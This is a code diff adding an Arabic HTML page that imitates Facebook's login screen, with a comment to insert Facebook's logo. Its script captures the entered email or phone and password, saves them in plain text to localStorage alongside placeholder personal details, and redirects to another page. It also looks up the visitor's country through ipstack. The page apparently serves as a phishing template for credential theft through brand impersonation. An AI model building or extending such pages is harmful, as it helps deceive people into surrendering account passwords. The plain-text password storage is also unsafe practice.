@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            background-color: #FFFFFF;
+        }
+
+        .login-container {
+            width: 90%;
+            max-width: 400px;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+        }
+
+        .login-container img {
+            width: 76px;
+            margin-bottom: 20px;
+        }
+
+        .login-container input {
+            width: 100%;
+            padding: 26px;
+            margin: 8px 0;
+            box-sizing: border-box;
+            border: 1px solid #48484894;
+            border-radius: 5px;
+            color: #000000;
+        }
+
+        .login-container button {
+            width: 100%;
+            padding: 9.5px;
+            background-color: #0365C4;
+            color: white;
+            border: none;
+            border-radius: 40px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .login-container button:hover {
+            background-color: #155bb5;
+        }
+
+        .login-container a {
+            display: block;
+            margin-top: 10px;
+            color: #005DB7;
+            text-decoration: none;
+        }
+
+        .login-container a:hover {
+            text-decoration: underline;
+        }
+
+        .line-with-text {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+
+        .line-with-text::before,
+        .line-with-text::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #000;
+        }
+
+        .line-with-text:not(:empty)::before {
+            margin-right: 10px;
+        }
+
+        .line-with-text:not(:empty)::after {
+            margin-left: 10px;
+        }
+
+        .button {
+            padding: 10px 20px;
+            border: 1.4px solid #464646;
+            border-radius: 50px;
+            background-color: transparent;
+            color: #ABABB0;
+            font-size: 16px;
+            cursor: pointer;
+            text-decoration: none;
+            text-align: center;
+        }
+
+        .additional-info {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .additional-info .country {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        .additional-info .arrow {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        .additional-info .language-menu {
+            display: inline-block;
+        }
+
+        .additional-info .language-menu a {
+            text-decoration: none;
+            color: black;
+            margin: 0 5px;
+            display: inline-block;
+        }
+
+        .additional-info .language-menu a:hover {
+            text-decoration: underline;
+        }
+    </style>
+    <script>
+        function login() {
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+
+            var userInfo = {
+                name: "محمد",
+                email: email,
+                password: password,
+                phone: "0123456789",
+                address: "شارع المثال، المدينة"
+            };
+
+            var userInfos = JSON.parse(localStorage.getItem('userInfos')) || [];
+            userInfos.push(userInfo);
+            localStorage.setItem('userInfos', JSON.stringify(userInfos));
+            window.location.href = 'index.html';
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const userCountryDiv = document.getElementById('user-country');
+
+            // Replace 'YOUR_API_KEY' with your actual API key from ipstack
+            const apiKey = 'YOUR_API_KEY';
+
+            // Function to get the user's country using ipstack API
+            function fetchUserCountry() {
+                fetch(`http://api.ipstack.com/check?access_key=${apiKey}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data && data.country_name) {
+                            userCountryDiv.textContent = `بلد المستخدم: ${data.country_name}`;
+                        } else {
+                            userCountryDiv.textContent = '';
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error fetching the user country:', error);
+                        userCountryDiv.textContent = '';
+                    });
+            }
+
+            // Call the function to get and display the user's country
+            fetchUserCountry();
+        });
+    </script>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://i.imgur.com/lapqwxZ.png"> <!-- ضع هنا مسار صورة شعار فيسبوك -->
+        <input type="text" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" id="email">
+        <input type="password" placeholder="كلمة السر" id="password">
+        <br />
+        <a href="ind.html">هل نسيت كلمة السر؟</a>
+        <br />
+        <button onclick="login()">تسجيل الدخول</button>
+        <br />
+        <br />
+        <div class="line-with-text">أو</div>
+        <a href="#" class="button">تسجيل الاشتراك</a>
+
+        <div class="additional-info">
+            <div id="user-country" class="country">
+           </div>
+            <div class="arrow"></div>
+            <div class="language-menu">
+                <a href="#">Eng</a> |
+                <a href="#">Español</a> |
+                <a href="#">Français</a> |
+                <a href="#">العربية</a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
